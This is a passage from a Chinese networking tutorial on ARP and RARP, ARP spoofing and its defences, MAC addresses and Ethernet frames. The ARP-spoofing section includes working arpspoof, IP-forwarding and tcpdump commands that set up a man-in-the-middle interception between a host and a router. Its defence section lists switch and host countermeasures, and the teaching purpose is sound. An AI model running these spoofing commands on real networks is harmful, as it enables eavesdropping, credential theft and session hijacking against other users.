= 3: RARP请求<br><span class="hljs-bullet">-</span> Operation = 4: RARP应答<br><br>现状：<br>RARP已过时，被以下协议取代：<br><span class="hljs-bullet">-</span> BOOTP<br><span class="hljs-bullet">-</span> DHCP (推荐)<br><br>原因：<br>❌ 需要专用服务器<br>❌ 功能单一（只能获取IP）<br>❌ 不提供网关、DNS等信息<br>❌ 难以管理<br><br>DHCP优势：<br>✅ 自动分配IP<br>✅ 提供完整网络配置<br>✅ 支持租约管理<br>✅ 易于部署和管理<br></code></pre></td></tr></table></figure><hr><h2 id="5-ARP安全问题"><a href="#5-ARP安全问题" class="headerlink" title="5. ARP安全问题"></a>5. ARP安全问题</h2><h3 id="5-1-ARP欺骗-ARP缓存投毒"><a href="#5-1-ARP欺骗-ARP缓存投毒" class="headerlink" title="5.1 ARP欺骗&#x2F;ARP缓存投毒"></a>5.1 ARP欺骗&#x2F;ARP缓存投毒</h3><p><strong>ARP欺骗原理</strong>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">ARP</span>欺骗 = <span class="hljs-variable constant_">ARP</span> <span class="hljs-title class_">Spoofing</span> = <span class="hljs-variable constant_">ARP</span> <span class="hljs-title class_">Cache</span> <span class="hljs-title class_">Poisoning</span><br><br>问题：<br><span class="hljs-variable constant_">ARP</span>协议没有认证机制！<br>- 任何主机都可以发送<span class="hljs-variable constant_">ARP</span>应答<br>- 主机无法验证<span class="hljs-variable constant_">ARP</span>应答的真实性<br>- 收到<span class="hljs-variable constant_">ARP</span>应答就更新缓存<br><br>攻击原理：<br>攻击者发送伪造的<span class="hljs-variable constant_">ARP</span>应答<br>→ 其他主机更新<span class="hljs-variable constant_">ARP</span>缓存为错误映射<br>→ 流量被重定向到攻击者<br><br>经典攻击：中间人攻击（<span class="hljs-variable constant_">MITM</span>）<br><br>正常情况：<br>主机A ←→ 路由器 ←→ 互联网<br><br><span class="hljs-variable constant_">ARP</span>欺骗后：<br>主机A ←→ 攻击者 ←→ 路由器 ←→ 互联网<br>           │<br>        窃听/篡改<br><br>攻击步骤：<br><br>网络环境：<br>- 主机<span class="hljs-symbol">A:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>)<br>- 路由器: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span>)<br>- 攻击者: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.50</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span>)<br><br>步骤<span class="hljs-number">1</span>: 攻击者 → 主机A<br>发送伪造的<span class="hljs-variable constant_">ARP</span>应答：<br><span class="hljs-string">&quot;192.168.1.1的MAC是EE:EE:EE:EE:EE:EE&quot;</span><br><br>主机A的<span class="hljs-variable constant_">ARP</span>缓存被修改：<br>原来: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> → <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span> (正确)<br>现在: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> → <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span> (错误！)<br><br>步骤<span class="hljs-number">2</span>: 攻击者 → 路由器<br>发送伪造的<span class="hljs-variable constant_">ARP</span>应答：<br><span class="hljs-string">&quot;192.168.1.10的MAC是EE:EE:EE:EE:EE:EE&quot;</span><br><br>路由器的<span class="hljs-variable constant_">ARP</span>缓存被修改：<br>原来: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> → <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (正确)<br>现在: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> → <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span> (错误！)<br><br>步骤<span class="hljs-number">3</span>: 双向流量被拦截<br>主机A发送数据到路由器 → 实际发到攻击者<br>路由器发送数据到主机A → 实际发到攻击者<br><br>步骤<span class="hljs-number">4</span>: 攻击者转发流量（保持连接）<br>攻击者收到主机A的数据 → 转发给路由器<br>攻击者收到路由器的数据 → 转发给主机A<br><br>结果：<br>✅ 主机A和路由器通信正常（看起来）<br>✅ 攻击者能看到所有流量<br>✅ 攻击者可以篡改流量<br>✅ 用户完全不知道！<br></code></pre></td></tr></table></figure><p><strong>攻击演示</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击工具：<br>- Ettercap<br>- arpspoof（dsniff工具包）<br>- Cain &amp; Abel<br>- Bettercap<br><br>示例（arpspoof）：<br><br><span class="hljs-comment"># 终端1：欺骗主机A</span><br><span class="hljs-built_in">sudo</span> arpspoof -i eth0 -t 192.168.1.10 192.168.1.1<br><span class="hljs-comment"># 告诉主机A：路由器的MAC是我的MAC</span><br><br><span class="hljs-comment"># 终端2：欺骗路由器</span><br><span class="hljs-built_in">sudo</span> arpspoof -i eth0 -t 192.168.1.1 192.168.1.10<br><span class="hljs-comment"># 告诉路由器：主机A的MAC是我的MAC</span><br><br><span class="hljs-comment"># 终端3：启用IP转发（保持连接）</span><br><span class="hljs-built_in">sudo</span> sysctl -w net.ipv4.ip_forward=1<br><br><span class="hljs-comment"># 终端4：抓包</span><br><span class="hljs-built_in">sudo</span> tcpdump -i eth0 -w capture.pcap<br><br>结果：<br>主机A的所有流量都被拦截！<br></code></pre></td></tr></table></figure><p><strong>攻击影响</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">可能的危害：<br><br><span class="hljs-bullet">1.</span> 窃听流量<br><span class="hljs-bullet">   -</span> 捕获用户名密码<br><span class="hljs-bullet">   -</span> 窃取敏感信息<br><span class="hljs-bullet">   -</span> 监控通信内容<br><br><span class="hljs-bullet">2.</span> 篡改流量<br><span class="hljs-bullet">   -</span> 修改网页内容<br><span class="hljs-bullet">   -</span> 注入恶意代码<br><span class="hljs-bullet">   -</span> 替换下载文件<br><br><span class="hljs-bullet">3.</span> 会话劫持<br><span class="hljs-bullet">   -</span> 窃取Session Cookie<br><span class="hljs-bullet">   -</span> 冒充用户身份<br><span class="hljs-bullet">   -</span> 非法操作<br><br><span class="hljs-bullet">4.</span> 拒绝服务<br><span class="hljs-bullet">   -</span> 不转发流量<br><span class="hljs-bullet">   -</span> 导致通信中断<br><span class="hljs-bullet">   -</span> 网络瘫痪<br><br><span class="hljs-bullet">5.</span> DNS欺骗<br><span class="hljs-bullet">   -</span> 拦截DNS查询<br><span class="hljs-bullet">   -</span> 返回伪造IP<br><span class="hljs-bullet">   -</span> 重定向到钓鱼网站<br></code></pre></td></tr></table></figure><h3 id="5-2-防御措施"><a href="#5-2-防御措施" class="headerlink" title="5.2 防御措施"></a>5.2 防御措施</h3><p><strong>技术防御</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 静态ARP绑定<br><span class="hljs-bullet">   -</span> 手动配置ARP表<br><span class="hljs-bullet">   -</span> 防止被覆盖<br><br>优点：<br>✅ 完全防御ARP欺骗<br><br>缺点：<br>❌ 管理复杂<br>❌ 难以扩展<br>❌ 需要人工维护<br><br>使用场景：<br><span class="hljs-bullet">-</span> 小型网络<br><span class="hljs-bullet">-</span> 关键服务器<br><span class="hljs-bullet">-</span> 高安全需求<br><br>示例：<br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">2.</span> 动态ARP检测（DAI）<br><span class="hljs-bullet">   -</span> 交换机功能<br><span class="hljs-bullet">   -</span> 验证ARP包的合法性<br><span class="hljs-bullet">   -</span> 丢弃伪造的ARP包<br><br>工作原理：<br><span class="hljs-bullet">-</span> 交换机维护IP-MAC-端口绑定表<br><span class="hljs-bullet">-</span> 检查ARP包是否与绑定表一致<br><span class="hljs-bullet">-</span> 不一致的ARP包被丢弃<br><br>配置（Cisco）：<br>Switch(config)# ip arp inspection vlan 1<br>Switch(config)# interface GigabitEthernet0/1<br>Switch(config-if)# ip arp inspection trust<br><br><span class="hljs-bullet">3.</span> IP源防护（IPSG）<br><span class="hljs-bullet">   -</span> 基于IP-MAC-端口绑定<br><span class="hljs-bullet">   -</span> 过滤非法IP包<br><br><span class="hljs-bullet">4.</span> DHCP侦听（DHCP Snooping）<br><span class="hljs-bullet">   -</span> 建立IP-MAC绑定数据库<br><span class="hljs-bullet">   -</span> 为DAI提供数据<br><br><span class="hljs-bullet">5.</span> 端口安全<br><span class="hljs-bullet">   -</span> 限制端口学习的MAC数量<br><span class="hljs-bullet">   -</span> 防止MAC泛洪<br><br><span class="hljs-bullet">6.</span> 802.1X认证<br><span class="hljs-bullet">   -</span> 端口级认证<br><span class="hljs-bullet">   -</span> 只允许认证设备接入<br><br><span class="hljs-bullet">7.</span> VLAN隔离<br><span class="hljs-bullet">   -</span> 分割广播域<br><span class="hljs-bullet">   -</span> 限制ARP欺骗范围<br><br><span class="hljs-bullet">8.</span> ARP监控工具<br><span class="hljs-bullet">   -</span> ArpWatch：监控ARP变化<br><span class="hljs-bullet">   -</span> arpON：主动防御<br><span class="hljs-bullet">   -</span> XArp：Windows工具<br><br><span class="hljs-bullet">9.</span> 使用加密协议<br><span class="hljs-bullet">   -</span> HTTPS代替HTTP<br><span class="hljs-bullet">   -</span> SSH代替Telnet<br><span class="hljs-bullet">   -</span> VPN隧道<br><span class="hljs-bullet">   -</span> 即使被中间人攻击，数据也是加密的<br></code></pre></td></tr></table></figure><p><strong>主机端防御</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Linux:<br><br><span class="hljs-bullet">1.</span> 安装arpwatch<br>sudo apt-get install arpwatch<br>sudo systemctl start arpwatch<br><span class="hljs-section"># 监控ARP变化，发送邮件警告</span><br><br><span class="hljs-bullet">2.</span> 配置静态ARP<br><span class="hljs-section"># 添加网关静态ARP</span><br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-section"># 持久化配置（Ubuntu）</span><br><span class="hljs-section"># 编辑 /etc/network/interfaces</span><br>up arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">3.</span> 使用arptables<br>sudo arptables -A INPUT -s 192.168.1.1 --source-mac ! aa:bb:cc:dd:ee:ff -j DROP<br><span class="hljs-section"># 只接受来自正确MAC的ARP</span><br><br>Windows:<br><br><span class="hljs-bullet">1.</span> 静态ARP<br>arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff<br><br><span class="hljs-bullet">2.</span> 使用XArp软件<br><span class="hljs-bullet">-</span> 图形化工具<br><span class="hljs-bullet">-</span> 实时监控<br><span class="hljs-bullet">-</span> 自动防御<br><br><span class="hljs-bullet">3.</span> 启用防火墙<br><span class="hljs-bullet">-</span> 防止未授权访问<br><br>macOS:<br><br><span class="hljs-bullet">1.</span> 静态ARP<br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">2.</span> 使用第三方工具<br><span class="hljs-bullet">-</span> Little Snitch<br><span class="hljs-bullet">-</span> ArpGuard<br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">网络管理员：<br><span class="hljs-bullet">1.</span> 部署交换机安全功能（DAI, IPSG, DHCP Snooping）<br><span class="hljs-bullet">2.</span> 使用VLAN隔离关键网络<br><span class="hljs-bullet">3.</span> 定期审计网络设备<br><span class="hljs-bullet">4.</span> 监控异常ARP流量<br><span class="hljs-bullet">5.</span> 实施端口安全策略<br><span class="hljs-bullet">6.</span> 启用802.1X认证<br><br>用户：<br><span class="hljs-bullet">1.</span> 使用加密协议（HTTPS, SSH, VPN）<br><span class="hljs-bullet">2.</span> 安装ARP监控工具<br><span class="hljs-bullet">3.</span> 定期检查ARP缓存<br><span class="hljs-bullet">4.</span> 避免在不安全网络（公共WiFi）传输敏感信息<br><span class="hljs-bullet">5.</span> 关键服务器使用静态ARP<br><span class="hljs-bullet">6.</span> 及时更新系统和软件<br><br>开发者：<br><span class="hljs-bullet">1.</span> 使用HTTPS<br><span class="hljs-bullet">2.</span> 实施证书验证<br><span class="hljs-bullet">3.</span> 使用HSTS<br><span class="hljs-bullet">4.</span> 警告用户不安全连接<br><span class="hljs-bullet">5.</span> 实施端到端加密<br></code></pre></td></tr></table></figure><hr><h2 id="6-MAC地址和以太网"><a href="#6-MAC地址和以太网" class="headerlink" title="6. MAC地址和以太网"></a>6. MAC地址和以太网</h2><h3 id="6-1-MAC地址"><a href="#6-1-MAC地址" class="headerlink" title="6.1 MAC地址"></a>6.1 MAC地址</h3><p><strong>MAC地址格式</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext">MAC地址 = Media Access Control Address<br>物理地址、硬件地址、以太网地址<br><br>格式：48位（6字节）<br>表示：12个十六进制数字<br><br>常见格式：<br>aa:bb:cc:dd:ee:ff  (冒号分隔)<br>aa-bb-cc-dd-ee-ff  (短横线分隔)<br>aabb.ccdd.eeff     (Cisco风格)<br>aabbccddeeff       (连续)<br><br>结构：<br>┌──────────────────┬──────────────────┐<br>│   OUI (24位)     │   NIC (24位)     │<br>│ 组织唯一标识符   │  网卡接口标识    │<br>└──────────────────┴──────────────────┘<br><br>示例：<br>00:1A:2B:3C:4D:5E<br><span class="hljs-attribute">│ │</span><br><span class="hljs-attribute">│ └─ 第一个字节的最低位</span><br><span class="hljs-attribute">│    = 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">单播地址</span><br><span class="hljs-attribute">│    = 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">多播地址</span><br><span class="hljs-attribute">│</span><br><span class="hljs-attribute">└─ 第一个字节的第二低位</span><br><span class="hljs-attribute">   = 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">全球唯一（OUI分配）</span><br>   <span class="hljs-attribute">= 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">本地管理</span><br><br>OUI（Organizationally Unique Identifier）：<br><span class="hljs-bullet">-</span> <span class="hljs-string">前3个字节</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IEEE分配给厂商</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">每个厂商唯一</span><br><br>常见OUI：<br>00:1A:2B - Apple<br>00:50:56 - VMware<br>08:00:27 - Oracle VirtualBox<br>52:54:00 - QEMU/KVM<br><br>NIC（Network Interface Controller）：<br><span class="hljs-bullet">-</span> <span class="hljs-string">后3个字节</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">厂商自行分配</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">同一厂商内唯一</span><br><br>特殊MAC地址：<br><br>1. 广播地址<br>   FF:FF:FF:FF:FF:FF<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">发送给所有主机</span><br><br>2. 多播地址<br>   01:00:5E:xx:xx:xx<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">IPv4多播映射</span><br><br>3. 零地址<br>   00:00:00:00:00:00<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">无效地址</span><br></code></pre></td></tr></table></figure><p><strong>MAC地址分类</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 单播MAC（Unicast）<br><span class="hljs-bullet">   -</span> 第一字节最低位 = 0<br><span class="hljs-bullet">   -</span> 一对一通信<br><span class="hljs-bullet">   -</span> 示例：00:1A:2B:3C:4D:5E<br><br><span class="hljs-bullet">2.</span> 多播MAC（Multicast）<br><span class="hljs-bullet">   -</span> 第一字节最低位 = 1<br><span class="hljs-bullet">   -</span> 一对多通信<br><span class="hljs-bullet">   -</span> 示例：01:00:5E:00:00:01<br><br><span class="hljs-bullet">3.</span> 广播MAC（Broadcast）<br><span class="hljs-bullet">   -</span> FF:FF:FF:FF:FF:FF<br><span class="hljs-bullet">   -</span> 发送给所有主机<br><br>全球唯一 vs 本地管理：<br><span class="hljs-bullet">-</span> 全球唯一：第一字节第二低位 = 0<br><span class="hljs-bullet">  -</span> IEEE分配的OUI<br><span class="hljs-bullet">  -</span> 理论上全球唯一<br><br><span class="hljs-bullet">-</span> 本地管理：第一字节第二低位 = 1<br><span class="hljs-bullet">  -</span> 本地配置<br><span class="hljs-bullet">  -</span> 可能冲突<br></code></pre></td></tr></table></figure><h3 id="6-2-以太网帧格式"><a href="#6-2-以太网帧格式" class="headerlink" title="6.2 以太网帧格式"></a>6.2 以太网帧格式</h3><p><strong>以太网II帧格式</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown">以太网帧（Ethernet Frame）<br><br>格式：<br>┌─────────┬─────────┬──────┬─────────┬─────┐<br>│ 前导码  │ 目标MAC │ 源MAC│  类型   │数据 │ FCS │<br>│ 8字节   │ 6字节   │ 6字节│ 2字节   │46-  │4字节│<br>│         │         │      │         │1500 │     │<br>└─────────┴─────────┴──────┴─────────┴─────┘<br><br>详细结构：<br><br><span class="hljs-bullet">1.</span> 前导码（Preamble）：8字节<br><span class="hljs-bullet">   -</span> 7字节前导码：10101010...<br><span class="hljs-bullet">   -</span> 1字节帧起始定界符（SFD）：10101011<br><span class="hljs-bullet">   -</span> 用于同步和帧定界<br><br><span class="hljs-bullet">2.</span> 目标MAC地址：6字节<br><span class="hljs-bullet">   -</span> 接收方的MAC地址<br><span class="hljs-bullet">   -</span> 可以是单播、多播、广播<br><br><span class="hljs-bullet">3.</span> 源MAC地址：6字节<br><span class="hljs-bullet">   -</span> 发送方的MAC地址<br><span class="hljs-bullet">   -</span> 必须是单播地址<br><br><span class="hljs-bullet">4.</span> 类型/长度字段：2字节<br><span class="hljs-bullet">   -</span> ≥ 1536（0x0600）：类型字段（以太网II）<br><span class="hljs-bullet">     -</span> 0x0800：IPv4<br><span class="hljs-bullet">     -</span> 0x0806：ARP<br><span class="hljs-bullet">     -</span> 0x86DD：IPv6<br><span class="hljs-bullet">   -</span> ≤ 1500：长度字段（IEEE 802.3）<br><br><span class="hljs-bullet">5.</span> 数据字段：46-1500字节<br><span class="hljs-bullet">   -</span> 上层协议数据<br><span class="hljs-bullet">   -</span> 最小46字节（不足填充）<br><span class="hljs-bullet">   -</span> 最大1500字节（MTU）<br><br><span class="hljs-bullet">6.</span> FCS（帧校验序列）：4字节<br><span class="hljs-bullet">   -</span> CRC-32校验<br><span class="hljs-bullet">   -</span> 检测传输错误<br><br>总长度：<br>最小帧：64字节（不含前导码）<br>最大帧：1518字节（不含前导码）<br><br>MTU（最大传输单元）：<br><span class="hljs-bullet">-</span> 以太网MTU：1500字节<br><span class="hljs-bullet">-</span> 数据字段最大长度<br><span class="hljs-bullet">-</span> 不包括以太网头部和FCS<br></code></pre></td></tr></table></figure><p><strong>帧类型</strong>：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">常见以太网类型值：<br><br><span class="hljs-number">0x0800</span> - IPv4<br>最常见的类型<br><br><span class="hljs-number">0x0806</span> - ARP<br>地址解析协议<br><br><span class="hljs-number">0x86DD</span> - IPv6<br>IPv6数据包<br><br><span class="hljs-number">0x8100</span> - <span class="hljs-number">802.</span><span class="hljs-number">1Q</span> VLAN标签<br>VLAN标记帧<br><br><span class="hljs-number">0x8847</span> - MPLS单播<br>MPLS标签<br><br><span class="hljs-number">0x8863</span> - 